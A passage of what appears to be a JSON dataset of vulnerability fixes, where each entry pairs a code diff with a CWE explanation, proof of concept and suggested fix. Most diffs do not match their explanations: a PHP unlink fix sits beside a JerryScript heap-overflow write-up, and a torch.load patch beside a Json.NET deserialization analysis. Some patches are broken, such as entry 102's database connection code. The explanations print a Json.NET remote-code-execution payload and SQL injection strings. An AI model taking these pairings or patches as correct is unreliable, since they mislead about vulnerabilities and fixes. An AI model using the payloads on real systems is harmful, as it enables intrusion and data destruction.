encoding, or parameter binding.\nExploit Scenario:\nAn attacker submits crafted data through an API that results in an unfiltered query object or relation object.\nThis leads the ORM/database to execute unintended commands \u2014 causing data leaks, unauthorized data modification, or even full database deletion.\nWhy It Happens:\nBecause user-controlled inputs are used to construct dynamic queries without strictly validating allowed fields, structures, or using prepared statements.\nSecurity Implications:\nIf exploited:\n\u2022\tFull database compromise\n\u2022\tSensitive information leak (usernames, passwords, financial data)\n\u2022\tDatabase corruption or data loss\n\u2022\tService downtime or permanent damage\nSuggested Fix:\n- var findResult = recMan.Find(query);\n+ ValidateQueryFields(query);\n+ var findResult = recMan.Find(SanitizeQuery(query));\nand\n- return DoResponse(new EntityRelationManager().Create(relation));\n+ ValidateRelationData(relation);\n+ return DoResponse(new EntityRelationManager().Create(SanitizeRelation(relation)));\n\n"
    },
    "116": {
        "diff": "--- Company.php\t2025-04-27\n+++ Company_fixed.php\t2025-04-27\n@@\n+ $safe_base_dir = '/var/www/uploads/logos'; // Define a secure base directory\n\n $logo_path = $logo_file;\n-$result = unlink($logo_path);\n+ $real_path = realpath($logo_path);\n+ if ($real_path === false || strpos($real_path, $safe_base_dir) !== 0) {\n+     // Invalid file path detected, abort\n+     error_log('Blocked unlink attempt on invalid path: ' . $logo_path);\n+ } else {\n+     $result = unlink($real_path);\n+ }\n",
        "explanation": "Vulnerability Type: CWE-122: Heap-Based Buffer Overflow\n\nProof of Concept: \nIn the JerryScript project, inside \n\nhttps://github.com/jerryscript-project/jerryscript/blob/master/jerry-core/parser/js/js-parser.c\n\nThe function `parser_compute_indicies`  incorrectly handles memory pointers when computing literal indices. \nSpecifically, the `char_p` pointer is taken from `literal_p->u.char_p` and used in pointer arithmetic without verifying that it points inside the valid source buffer (`context_p->source_start_p` to `context_p->source_end_p`). \nIf an attacker provides a malicious input that manipulates parsing, it is possible for `char_p` to point out-of-bounds, causing unsafe memory reads or writes.\n\nVulnerable snippet:\n\nLine: 112\n```\nconst uint8_t *char_p = literal_p->u.char_p;\nif ((literal_p->status_flags & LEXER_FLAG_SOURCE_PTR) && literal_p->prop.length < 0xfff)\n{\n    size_t bytes_to_end = (size_t) (context_p->source_end_p - char_p);\n\n    if (bytes_to_end < 0xfffff)\n    {\n        literal_p->u.source_data = ((uint32_t) bytes_to_end) | (((uint32_t) literal_p->prop.length) << 20);\n    }\n}\n```\nThere is no check that `char_p` is within the valid source bounds, leading to heap corruption if it is manipulated.\n\nOWASP Top 10 Category: A03:2021 \u2013 Injection\n\nSeverity: Critical (Level 5)\n\nRoot Cause: Missing bounds validation when computing memory offset between user-controlled pointers and legitimate buffers.\n\nExploit Scenario: An attacker crafts a malformed JavaScript source that corrupts the `lexer_literal_t` structure to make `char_p` point outside the legitimate source buffer, leading to heap memory corruption during parsing.\n\nWhy It Happens: Unsafe assumptions about the validity of internal pointers derived from user-controlled input without proper runtime validation.\n\nSecurity Implications: Successful exploitation could lead to heap overflows, denial of service (application crash), memory disclosure, or remote code execution depending on memory layout and compilation options.\n\nSuggested Fix: Before using `char_p`, validate that `char_p >= context_p->source_start_p` and `char_p <= context_p->source_end_p` to ensure safe pointer arithmetic."
    },
    "133": {
        "diff": "--- a/your_vulnerable_file.py\n+++ b/your_vulnerable_file.py\n@@ def main(args):\n-    state_dict = torch.load(args.weight, map_location=\"cpu\")\n-    model.load_state_dict(state_dict, strict=True)\n+    state_dict = torch.load(args.weight, map_location=\"cpu\")\n+    if not isinstance(state_dict, dict):\n+        raise ValueError(\"Loaded object is not a state_dict dictionary. Possible unsafe pickle detected.\")\n+    model.load_state_dict(state\n",
        "explanation": "Vulnerability Analysis for JobDataService.cs\n\nVulnerability Type:\nCWE-502: Deserialization of Untrusted Data\n[line: 27,297,346,96]\nProof of Concept (Elaborated):\nVulnerable Code:\nJsonSerializerSettings settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };\n\nStep-by-Step Explanation:\n1.\tProblem:\nSetting TypeNameHandling = TypeNameHandling.All tells Json.NET to trust type information in JSON when deserializing.\nThat means if an attacker supplies malicious JSON containing a $type field, arbitrary types from assemblies could be loaded and instantiated during deserialization.\n2.\tHow to Attack:\nAn attacker could inject a payload like:\n3.\t{\n4.\t  \"$type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework\",\n5.\t  \"MethodName\": \"Start\",\n6.\t  \"MethodParameters\": [\"cmd\", \"/c calc.exe\"]\n7.\t}\no\tThis payload causes arbitrary code execution (e.g., opening Calculator).\no\tMuch worse payloads (like downloading malware) are possible.\n\nExample Exploit:\nAttacker Payload:\n{\n  \"$type\": \"System.Diagnostics.Process, System\",\n  \"StartInfo\": {\n    \"FileName\": \"cmd.exe\",\n    \"Arguments\": \"/c whoami > C:\\\\pwned.txt\"\n  }\n}\nResult:\n\u2022\tWhen deserialized, the server spawns a process and executes attacker-controlled commands.\n\nSeverity:\nCritical (Remote Code Execution [RCE])\n\nRoot Cause:\nUsing TypeNameHandling.All blindly trusts user-supplied type metadata and deserializes arbitrary classes, leading to possible execution of unintended dangerous code paths.\n\nExploit Scenario:\nAn attacker sends malicious JSON with dangerous $type fields.\nWhen deserialized, the server runs attacker-controlled code, which could lead to:\n\u2022\tRemote Command Execution\n\u2022\tComplete Server Takeover\n\u2022\tData Theft\n\u2022\tService Destruction\n\nWhy It Happens:\nBecause TypeNameHandling is set to All, allowing polymorphic deserialization without restricting which types are allowed \u2014 trusting any type name in the input.\n\nSecurity Implications:\nIf exploited:\n\u2022\tAttackers can execute arbitrary code on your server.\n\u2022\tTotal system compromise is possible.\n\u2022\tRansomware deployment, data leaks, system wipes can happen.\nSuggested Fix:\n--- JobDataService.cs\t2025-04-27\n+++ JobDataService_fixed.cs\t2025-04-27\n@@\n- JsonSerializerSettings settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };\n+ JsonSerializerSettings settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.None };\n"
    },
    "134": {
        "diff": "--- a/src/pages/Movies.js\n+++ b/src/pages/Movies.js\n@@\n import React, { useEffect, useState } from \"react\";\n import Layout from \"../components/Layout\";\n import Loader from \"../components/Loader\";\n import { useNavigate } from \"react-router-dom\";\n import { collection, getDocs } from \"firebase/firestore\";\n import { db } from \"../fireBase/config\";\n\n+const validateImageUrl = (url) => {\n+  try {\n+    const parsed = new URL(url);\n+    return parsed.protocol === 'https:' || parsed.protocol === 'http:';\n+  } catch {\n+    return false;\n+  }\n+};\n+\n+const sanitizeId = (id) => {\n+  const pattern = /^[a-zA-Z0-9_-]+$/;\n+  return pattern.test(id);\n+};\n\n const Movies = () => {\n   const navigate = useNavigate();\n-  const [postLists, setPostList] = useState();\n+  const [postLists, setPostList] = useState([]);\n+  const [error, setError] = useState(false);\n\n   const postCollectionref = collection(db, \"movies\");\n-  const getMovieData = async () => {\n-    const data = await getDocs(postCollectionref);\n-    setPostList(data.docs.map((doc) => ({ ...doc.data(), id: doc.id })));\n-  };\n+  \n+  const getMovieData = async () => {\n+    try {\n+      const data = await getDocs(postCollectionref);\n+      const sanitizedData = data.docs.map((doc) => ({\n+        ...doc.data(),\n+        id: doc.id,\n+      }));\n+      setPostList(sanitizedData);\n+    } catch (err) {\n+      console.error(\"Failed to fetch movie data:\", err);\n+      setError(true);\n+    }\n+  };\n\n   useEffect(() => {\n     getMovieData();\n   }, []);\n\n   return (\n     <div>\n       <Layout title={\"Movies\"}>\n         <div className=\"details-container\">\n           <div className=\"left-details\">\n             <h1 className=\"internship-heading\">All Movies Data</h1>\n             <div className=\"card-container\">\n-              {postLists && postLists.length > 0 ? (\n-                postLists.map((item) => (\n-                  <div className=\"card\" key={item.id}>\n-                    <img src={item.url} alt=\"\" />\n-                    <h4 className=\"card-info\">{item.title}</h4>\n-                    <button\n-                      className=\"l-n-btn\"\n-                      style={{ backgroundColor: \"\" }}\n-                      onClick={() => navigate(`/movies/${item.id}`)}\n-                    >\n-                      Open\n-                    </button>\n-                  </div>\n-                ))\n-              ) : (\n-                <Loader />\n-              )}\n+              {error ? (\n+                <p style={{ color: \"red\", fontWeight: \"bold\" }}>\n+                  Failed to load movies. Please try again later.\n+                </p>\n+              ) : postLists.length > 0 ? (\n+                postLists.map((item) => (\n+                  <div className=\"card\" key={item.id}>\n+                    {validateImageUrl(item.url) ? (\n+                      <img src={item.url} alt={item.title || \"movie poster\"} />\n+                    ) : (\n+                      <div className=\"image-placeholder\">Invalid Image</div>\n+                    )}\n+                    <h4 className=\"card-info\">{item.title}</h4>\n+                    <button\n+                      className=\"l-n-btn\"\n+                      style={{ backgroundColor: \"\" }}\n+                      onClick={() => {\n+                        if (sanitizeId(item.id)) {\n+                          navigate(`/movies/${item.id}`);\n+                        } else {\n+                          alert(\"Invalid movie ID detected!\");\n+                        }\n+                      }}\n+                    >\n+                      Open\n+                    </button>\n+                  </div>\n+                ))\n+              ) : (\n+                <Loader />\n+              )}\n             </div>\n           </div>\n           <div className=\"right-details\"></div>\n         </div>\n       </Layout>\n     </div>\n   );\n };\n\n export default Movies;\n",
        "explanation": "Vulnerability Type:\nCWE-353: Missing Support for Integrity Check\n\nProof of Concept:\nThe vulnerable code includes external scripts without the integrity attribute:\n\n<script src=\"https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js\"></script>\n<script src=\"https://oss.maxcdn.com/respond/1.4.2/respond.min.js\"></script>\nThese lines load JavaScript from external CDNs, but the absence of the integrity attribute allows these files to be replaced with malicious content by an attacker who compromises the CDN or performs a man-in-the-middle (MitM) attack.\n\nSeverity:\nLOW\n\nRoot Cause:\nThe root cause is the missing integrity attribute on externally loaded scripts, which prevents the browser from verifying the authenticity of the fetched file. Without this attribute, there is no way to ensure the file has not been modified by an attacker.\n\nExploit Scenario:\nAn attacker compromises the CDN hosting the html5shiv or respond scripts. When a user loads the page, the modified malicious script executes in the user's browser, potentially stealing sensitive information, injecting keyloggers, or hijacking session cookies.\n\nWhy It Happens:\nThe application does not implement Subresource Integrity (SRI) for external scripts. This security feature is designed to allow browsers to verify that files they fetch (e.g., from a CDN) are delivered without unexpected manipulation.\n\nSecurity Implications:\nWithout integrity checks, any external script could be modified by a malicious actor to include harmful code. If exploited, this could result in client-side script execution, data theft, phishing, or other malicious behavior that undermines the trust and security of the application.\n\nSuggested Fix:\nAdd the integrity and crossorigin=\"anonymous\" attributes to all external script tags that load third-party code. This ensures that browsers will verify the content before execution, protecting against tampered scripts and MitM attacks.\n\nExample Fix:\n\n<script src=\"https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js\" integrity=\"sha384-rkct3+bwJNTKG3S0sLMgxi0zG4vF1E1oyWJWZcg1KOHqPYY8kXqlO+6SWdBQWiQ/\" crossorigin=\"anonymous\"></script>"
    },
    "102": {
        "diff": "--- shop.py     2025-04-27 13:22:31.000000000 -0400\n+++ shop-new.py 2025-04-27 13:22:31.000000000 -0400\n@@ -5,9 +5,15 @@\n import operator\n import datetime\n import webbrowser\n+import os\n \n-\n-conn = pymysql.connect(host=\"localhost\",user=\"root\",password=\"root123\",db=\"foodmenu\")\n+mydb=mysql.connector.connect(\n+    host=os.environ['DB_HOST'],\n+    user=os.environ['DB_USER'],\n+    passwd=os.environ['DB_PASS'],\n+    database=os.environ['DB_NAME']\n+)\n+conn = pymysql.connect(host,user,password,db)\n curs = conn.cursor()\n \n class Shop:\n",
        "explanation": "Explanation:\nThe shop.py code contains SQL Injection due to unsanitized user input being directly concatenated into SQL queries. This allows attackers to execute arbitrary SQL statements, potentially leading to data theft, modification, or even complete database compromise.\n\nPOC:\nSuppose a user sets the shop name to MyShop; DROP TABLE login_details; --. When the following line executes:\n\nsqlQuery = \"SELECT * FROM \"+self.name+\"_menu\"\n\n\nIt becomes:\n\nSELECT * FROM MyShop; DROP TABLE login_details; --_menu\n\nThis would drop the login_details table if the database allows multiple statements.\n\n\nRoot Cause: Shop.py File\n\nLine 94 (getMenu):\n\nsqlQuery = \"SELECT * FROM \"+self.name+\"_menu\"\ncurs.execute(sqlQuery)\nHere, self.name is derived from user input, making the query vulnerable to SQL injection.\n\nLine 215 (submit_order):\n\nsqlQuery = \"UPDATE \"+self.name+\"_menu SET rank=\"+repr(food.rank+qnty)+\" WHERE food=\"+repr(food.name)\ncurs.execute(sqlQuery)\nAgain, self.name and food.name are not sanitized.\n\nLine 312 (savemenu):\n\nsqlQuery = \"DELETE FROM \"+self.name+\"_menu\"\ncurs.execute(sqlQuery)\nand\n\nsqlQuery = \"INSERT INTO \"+self.name+\"_menu VALUES(\"+repr(food.name)+\", \"+repr(food.price)+\", \"+repr(food.rank)+\");\"\ncurs.execute(sqlQuery)\nBoth use unsanitized user input for table and value names.\n\nExploit Scenario:\nAn attacker could input a malicious shop name or food name such as MyShop; DROP TABLE login_details; -- which would cause the application to execute unintended SQL commands, leading to data loss or corruption.\n\nWhy it Happens:\nThe code directly concatenates user-controlled input into SQL queries without any sanitization or use of parameterized queries. This allows attackers to inject arbitrary SQL code.\n\n\nSecurity Implications:\nData Breach: Attackers could read sensitive data from the database.\nData Loss: Attackers could drop tables, delete data, or corrupt the database.\nPrivilege Escalation: Attackers could modify authentication data or escalate privileges.\n\n\nSuggested Fix:\nNever concatenate user input directly into SQL queries.\nUse parameterized queries for all SQL statements.\nValidate and sanitize all user input, especially when constructing table or column names.\n\n\nPatch fix for getMenu:\n\ndef getMenu(self):\n    self.menu = foodmenu.Menu()\n    # Only allow alphanumeric and underscores in table names\n    if not re.match(r'^\\w+$', self.name):\n        raise ValueError(\"Invalid shop name\")\n    table_name = f\"{self.name}_menu\"\n    sqlQuery = f\"SELECT * FROM `{table_name}`\"\n    curs.execute(sqlQuery)\n    foods = curs.fetchall()\n    for values in foods:\n        food = foodmenu.Food(*values)\n        self.menu.add(food)\n    self.menu.reduceRanks()\n\nUse a regular expression to validate self.name.\nUse backticks to quote table names and prevent injection.\n\nFor queries with values, always use placeholders:\n\nsqlQuery = f\"UPDATE `{table_name}` SET rank=%s WHERE food=%s\"\ncurs.execute(sqlQuery, (food.rank+qnty, food.name))"
    },
    "151": {
        "diff": "@@\n-app.use(session({\n-    secret: 'secret-key',\n-    resave: false,\n-    saveUninitialized: true\n-}));\n+app.use(session({\n+    secret: 'secret-key',\n+    resave: false,\n+    saveUninitialized: true,\n+    cookie: { secure: process.env.NODE_ENV === 'production' }\n+}));\n",
        "explanation": "Vulnerability Type:\nCWE-319: Cleartext Transmission of Sensitive Information\n\nSeverity:\nVery Low\n\nRoot Cause:\nThe script makes HTTP requests to http://www.amazon.com/dp/{asin}, which uses unencrypted cleartext transmission. This leaves the data (including product requests and responses) vulnerable to interception, modification, or eavesdropping by attackers during transmission over untrusted networks.\n\nExploit Scenario:\nA malicious actor on a public Wi-Fi network uses a packet-sniffing tool (e.g., Wireshark) to monitor traffic from the scraper. Since the scraper sends requests to http://amazon.com, the attacker can:\n\nIntercept and read the response data in plain text.\n\nSee which products are being scraped.\n\nPotentially manipulate responses via MitM attacks.\n\nWhy It Happens:\nThe developer used http:// in the base URL:\n\n\nURL = 'http://www.amazon.com/dp/'\nThis instructs requests.get(...) to initiate unsecured connections. Without TLS encryption (which https:// provides), the transmitted data is exposed to the network layer.\n\nSecurity Implications:\nSensitive data exposure \u2014 While ASINs may not be confidential, interception may reveal scraping behavior or be part of a broader attack vector.\n\nData integrity risks \u2014 Man-in-the-middle attackers can modify responses.\n\nBlocking and legal risks \u2014 Amazon may detect scraping more easily over HTTP, as HTTPS provides encrypted headers and payloads.\n\nProof of Concept:\n\n# Vulnerable line\nURL = 'http://www.amazon.com/dp/'\n...\npage = requests.get(subdomain + PROXY + URL + identifier)\nTraffic generated here is unencrypted and can be sniffed.\n\nSuggested Fix:\nUse HTTPS for all requests to ensure encryption in transit:\n\n- URL = 'http://www.amazon.com/dp/'\n+ URL = 'https://www.amazon.com/dp/'"
    },
    "158": {
        "diff": "# Remove dangerous flag and add verification\ndef load_safe_index(path, embeddings):\n    if not os.path.exists(f\"{path}/index.faiss\"):\n        raise FileNotFoundError(\"Index missing\")\n    \n    # Verify file signature\n    with open(f\"{path}/index.faiss\", \"rb\") as f:\n        if not f.read(4) == b'FAIS':  # Magic number\n            raise ValueError(\"Invalid index format\")\n    \n    return FAISS.load_local(path, embeddings)  # Safe default",
        "explanation": "The code contains two high severity issues including CWE-89 (SQL Injection) and CWE-259 (Use of Hard-Coded Password)\n\n====================================================\n\nCWE-89 (SQL Injection):\n\nExplanation: The code concatenates user inputs directly into SQL queries, allowing attackers to inject malicious SQL commands.\n\n\nPOC:\nFor search() method, input \"mobile' OR '1'='1\";--\" in the search field to dump all customer records.\n\n\nRoot Cause: \n\nFile \nhttps://github.com/AnnuNITW/Hotel-Management-System-Using-Python/blob/main/customer.py\nLine 385: con_cursor.execute(\"select * from customer where \"+str(self.search_var.get())+\" LIKE'%\"+str(self.txt_search.get())+\"%'\")\n\nString concatenation of search_var and txt_search directly into the SQL query.\n\n\nExploit Scenario: \nAttackers bypass authentication, dump sensitive data, or delete records.\n\n\nWhy it Happens: \nLack of parameterized queries for search functionality.\n\n\nSecurity Implications: \nFull database compromise, data theft, and unauthorized access.\n\n\nSuggested Fix:\nUse Parameterized Queries instead of directly using user input.\n\nPatch:\n\ncon_cursor.execute(\n    f\"SELECT * FROM customer WHERE {self.search_var.get()} LIKE %s\",\n    ('%' + self.txt_search.get() + '%',)\n)\n\n=============================================================================\n\nCWE-259 (Use of Hard-Coded Password)\n\nExplanation: \nDatabase credentials (mysql123) are hardcoded in multiple methods.\n\n\nRoot Cause: \nFile https://github.com/AnnuNITW/Hotel-Management-System-Using-Python/blob/main/customer.py\nLines 263, 287, 322, 350 and 382: Repeated in add_data(), fetch_data(), update(), Delete(), and search().\n\n\nExploit Scenario: \nAttackers extract credentials from decompiled code or shared repositories.\n\n\nWhy it Happens: \nLack of secure credential management.\n\n\nSecurity Implications: \nUnauthorized database access and data exfiltration.\n\n\nSuggested Fix:\nUse environment variables or a secure secrets manager.\n\nPatch:\n\nconn = mysql.connector.connect(\n    host=os.getenv('DB_HOST'),\n    user=os.getenv('DB_USER'),\n    password=os.getenv('DB_PASS'),\n    database='worksheet'\n)"
    },
    "167": {
        "diff": "import { useState } from 'react';\nimport TextField from '@mui/material/TextField';\nimport Button from '@mui/material/Button';\nimport \"./WeatherSearch.css\";\n\nexport default function WeatherSearch({ updateInfo }) {\n  const [city, setCity] = useState(\"\");\n  const [error, setError] = useState(\"\");\n  const [loading, setLoading] = useState(false);\n\n  const API_URL = \"https://api.openweathermap.org/data/2.5/weather\";\n  const API_KEY = process.env.REACT_APP_WEATHER_API_KEY;\n\n  const getWeatherInfo = async () => {\n    const sanitizedCity = city.trim();\n\n    if (!sanitizedCity || !/^[a-zA-Z\\s]{2,50}$/.test(sanitizedCity)) {\n      throw new Error(\"Invalid city name. Only letters allowed.\");\n    }\n\n    const response = await fetch(\n      `${API_URL}?q=${encodeURIComponent(sanitizedCity)}&appid=${API_KEY}&units=metric`\n    );\n\n    if (!response.ok) {\n      throw new Error(\"City not found or API error.\");\n    }\n\n    const jsonResponse = await response.json();\n\n    if (jsonResponse.cod !== 200 || !jsonResponse.main) {\n      throw new Error(\"Invalid response from API.\");\n    }\n\n    return {\n      city: sanitizedCity,\n      temp: jsonResponse.main.temp,\n      tempMin: jsonResponse.main.temp_min,\n      tempMax: jsonResponse.main.temp_max,\n      humidity: jsonResponse.main.humidity,\n      feelslike: jsonResponse.main.feels_like,\n      weather: jsonResponse.weather[0].description,\n    };\n  };\n\n  const handleChange = (event) => {\n    setCity(event.target.value);\n    setError(\"\");\n  };\n\n  const handleSubmit = async (event) => {\n    event.preventDefault();\n    setError(\"\");\n    setLoading(true);\n\n    try {\n      const newInfo = await getWeatherInfo();\n      updateInfo(newInfo);\n      setCity(\"\");\n    } catch (err) {\n      console.error(err);\n      setError(err.message || \"No such place found in our API.\");\n    } finally {\n      setLoading(false);\n    }\n  };\n\n  return (\n    <div className=\"Search\">\n      <form onSubmit={handleSubmit}>\n        <TextField\n          id=\"city\"\n          label=\"City Name\"\n          variant=\"outlined\"\n          required\n          value={city}\n          onChange={handleChange}\n        />\n        <br /><br />\n        <Button variant=\"contained\" type=\"submit\" disabled={loading}>\n          {loading ? \"Loading...\" : \"Search\"}\n        </Button>\n        {error && <p style={{ color: \"red\" }}>{error}</p>}\n      </form>\n    </div>\n  );\n}\n",
        "explanation": "Explanation: \nData transmitted via sockets is unencrypted, exposing sensitive information to interception.\n\n\nPOC: \nAttacker uses packet sniffer to capture unencrypted piece requests/transfers.\n\n\nRoot Cause: File peers_manager.py\nLack of TLS/SSL implementation in socket communication (entire PeersManager class).\n\n\nExploit Scenario: \nMITM attacker intercepts torrent pieces containing sensitive metadata.\n\n\nWhy it Happens: \nNo encryption layer implemented in _read_from_socket/send_to_peer methods.\n\n\nSecurity Implications: \nData theft, traffic manipulation, peer spoofing.\n\n\nSuggested Fix:\nImplement SSL/TLS encryption in the socket communication.\n\nPatch Fix:\n\nimport ssl\ncontext = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\ncontext.load_cert_chain(certfile=\"server.crt\", keyfile=\"server.key\")\nsecure_socket = context.wrap_socket(peer.socket, server_side=True)"
    },
    "104": {
        "diff": "diff --git a/LMSCode.cpp b/LMSCode.cpp\n--- a/LMSCode.cpp\n+++ b/LMSCode.cpp\n@@ -4,6 +4,8 @@\n #include<stdlib.h> \n #include<string.h>\n #include<stdio.h>\n #include<fstream.h>\n+#include <limits>  // For input validation\n\n class book\n {\n@@ -11,6 +13,8 @@\n    char bname[50];//bookname\n    char aname[20];//authorname\n+    int copies;    // Track available copies\n+    bool issued;   // Track issuance status\n public:\n    void createbook()\n    {\n@@ -19,9 +23,14 @@\n        cin>>bno;\n        cout<<\"\\nENTER BOOK NAME\";\n        gets(bname);//enables enter with space\n        cout<<\"\\nENTER AUTHOR NAME\";\n        gets(aname);\n+        issued = false;\n+        cout<<\"\\nENTER NUMBER OF COPIES: \";\n+        cin>>copies;\n+        cin.ignore(numeric_limits<streamsize>::max(), '\\n');  // Clear input buffer\n        cout<<\"\\n\\n\\nBook Created..\";\n    }\n+    \n    void showbook()\n    {\n        cout<<\"\\nBook Number: \"<<bno;\n@@ -38,6 +47,12 @@\n        gets(aname);\n        \n    }\n+    \n+    // New methods for copy management\n+    int getCopies() { return copies; }\n+    bool isIssued() { return issued; }\n+    void setIssued(bool status) { issued = status; }\n+    void decrementCopies() { if(copies > 0) copies--; }\n+    void incrementCopies() { copies++; }\n\n    char* retbno()//string return\n    {\n@@ -163,6 +178,7 @@\n        token=1;\n    }\n    void resettoken()\n-   { \n-   token=0;\n+   {\n+       token=0;\n+       stbno[0] = '\\0';  // Clear book number\n    }\n    void getstbno(char t[])\n@@ -358,42 +374,62 @@\n void bookissue()\n {\n-   char sn[6],bn[6];\n-   int found=0,flag=0;\n+   char sn[6], bn[6];\n+   int found = 0, flag = 0;\n    clrscr();\n    cout<<\"\\n\\nBOOK ISSUE...\";\n    cout<<\"\\n\\n\\tEnter Admission no.\";\n    cin>>sn;\n-   fp.open(\"student.dat\",ios::in|ios::out);\n-   fp1.open(\"book.dat\",ios::in|ios::out);\n-   while(fp.read((char*)&st,sizeof(student))&& found==0)\n+   fp.open(\"student.dat\", ios::in|ios::out);\n+   fp1.open(\"book.dat\", ios::in|ios::out);\n+\n+   while(fp.read((char*)&st, sizeof(student)) && found == 0)\n    {\n-       if(strcmpi(st.retadmno(),sn)==0)//compare admsn no.\n+       if(strcmpi(st.retadmno(), sn) == 0)\n        {\n-           found=1;\n-           if(st.rettoken()==0)//if book not issued\n+           found = 1;\n+           if(st.rettoken() == 0)\n            {\n                cout<<\"\\n\\n\\tEnter The Book No.\";\n-               cin>>bn;\n-               while(fp1.read((char*)&bk,sizeof(book))&& flag==0)\n+               cin >> bn;\n+               cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n+\n+               while(fp1.read((char*)&bk, sizeof(book)) && flag == 0)\n                {\n-                   if(strcmpi(bk.retbno(),bn)==0)//compare book no.\n-                   {\n-                       flag=1;\n-                       st.addtoken();\n-                       st.getstbno(bk.retbno());//pass book no.\n-                       int pos=-1*sizeof(st);\n-                       fp.seekg(pos,ios::cur);\n-                       fp.write((char*)&st,sizeof(student));\n-                       cout<<\"\\n\\n\\tBook Issued Successfully\\n\\n Please Note The Book Issue Date On Backside Of Your Book And Return Book Within 15 Days, Otherwise Fine Of 15 Rs Per Day\";\n-                       \n-                    \n-               }\n-           }\n-           if(flag==0)\n-           {\n-               cout<<\"Book No. Does Not Exists\";\n+                   if(strcmpi(bk.retbno(), bn) == 0)\n+                   {\n+                       flag = 1;\n+                       if(bk.getCopies() > 0 && !bk.isIssued())\n+                       {\n+                           bk.decrementCopies();\n+                           bk.setIssued(true);\n+                           \n+                           // Update book record\n+                           int bpos = -1 * sizeof(bk);\n+                           fp1.seekp(bpos, ios::cur);\n+                           fp1.write((char*)&bk, sizeof(book));\n+\n+                           // Update student record\n+                           st.addtoken();\n+                           st.getstbno(bk.retbno());\n+                           int spos = -1 * sizeof(st);\n+                           fp.seekg(spos, ios::cur);\n+                           fp.write((char*)&st, sizeof(student));\n+                           \n+                           cout<<\"\\n\\n\\tBook Issued Successfully!\\n\";\n+                           cout<<\"Remaining copies: \"<<bk.getCopies()<<endl;\n+                       }\n+                       else\n+                       {\n+                           cout<<\"\\n\\n\\tBook not available!\";\n+                           if(bk.getCopies() <= 0) cout<<\" (No copies left)\";\n+                           if(bk.isIssued()) cout<<\" (Already issued)\";\n+                       }\n+                   }\n+               }\n+               if(flag == 0)\n+               {\n+                   cout<<\"\\nBook No. Does Not Exist\";\n+               }\n            }\n-           \n        }\n-       \n        else\n        {\n-           \n            cout<<\"You Have Not Returned The Last Book\";\n-           \n        }\n-       \n-   }\n-   \n }\n if(found==0)\n {\n-   cout<<\"Student Record Not Exists...\";\n-   \n+   cout<<\"Student Record Not Found\";\n }\n getch();\n fp.close();\n fp1.close();\n }\n\n void bookdeposit()\n {\n-   char sn[6],bn[6];\n-   int found=0,flag=0,day,fine;\n+   char sn[6];\n+   int found = 0, flag = 0, day, fine;\n    clrscr();\n    cout<<\"\\n\\nBOOK DEPOSIT...\";\n    cout<<\"\\n\\n\\tEnter Admission no. Of Student\";\n    cin>>sn;\n-   fp.open(\"student.dat\",ios::in|ios::out);\n-   fp1.open(\"book.dat\",ios::in|ios::out);\n-   while(fp.read((char*)&st,sizeof(student))&& found==0)\n+   cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n+\n+   fp.open(\"student.dat\", ios::in|ios::out);\n+   fp1.open(\"book.dat\", ios::in|ios::out);\n+\n+   while(fp.read((char*)&st, sizeof(student)) && found == 0)\n    {\n-       if(strcmpi(st.retadmno(),sn)==0)//compare admsn no.\n+       if(strcmpi(st.retadmno(), sn) == 0)\n        {\n-           found=1;\n-           if(st.rettoken()==1)//if book issued\n+           found = 1;\n+           if(st.rettoken() == 1)\n            {\n-               while(fp1.read((char*)&bk,sizeof(book))&& flag==0)\n+               char issuedBookNo[6];\n+               strcpy(issuedBookNo, st.retstbno());\n+               \n+               while(fp1.read((char*)&bk, sizeof(book)) && flag == 0)\n                {\n-                   if(strcmpi(bk.retbno(),st.retstbno())==0)\n+                   if(strcmpi(bk.retbno(), issuedBookNo) == 0)\n                    {\n-                       flag=1;\n+                       flag = 1;\n                        bk.showbook();\n                        cout<<\"\\n\\n Book Deposited In No. Of Days\";\n                        cin>>day;\n+                       cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n+                       \n                        if(day>15)\n                        {\n-                           fine=(day-15)*1;\n-                           cout<<\"\\n\\n Fine = \"<<fine;\n+                           fine = (day - 15) * 15; // 15 Rs/day fine\n+                           cout<<\"\\n\\nFine = \"<<fine<<\" Rs\";\n                        }\n+                       else\n+                       {\n+                           fine = 0;\n+                       }\n+                       \n+                       // Update book status\n+                       bk.incrementCopies();\n+                       bk.setIssued(false);\n+                       int bpos = -1 * sizeof(bk);\n+                       fp1.seekp(bpos, ios::cur);\n+                       fp1.write((char*)&bk, sizeof(book));\n+                       \n+                       // Update student status\n                        st.resettoken();\n-                       \n                        int pos=-1*sizeof(st);\n                        fp.seekg(pos,ios::cur);\n                        fp.write((char*)&st,sizeof(student));\n-                       cout<<\"\\n\\n\\tBook Deposited Successfully\";\n-                       \n-                    \n-               }\n-           }\n-           if(flag==0)\n-           {\n-               cout<<\"Book No. Does Not Exists\";\n+                       cout<<\"\\n\\n\\tBook Deposited Successfully!\";\n+                       cout<<\"\\nFine charged: \"<<fine<<\" Rs\";\n                    }\n                }\n-               \n-           }\n-           \n-           else\n-           {\n-               \n-               cout<<\"No Book Issued\";\n-               \n+               if(flag == 0)\n+               {\n+                   cout<<\"\\nBook record not found!\";\n+               }\n            }\n-           \n-       }\n-       \n+           else\n+           {\n+               cout<<\"\\nNo Book Issued to this student!\";\n+           }\n        }\n-       \n-   }\n-   \n+   }\n    if(found==0)\n    {\n-       cout<<\"Student Record Not Exists...\";\n-       \n+       cout<<\"Student Record Not Found\";\n    }\n    getch();\n    fp.close();\n    fp1.close();\n }",
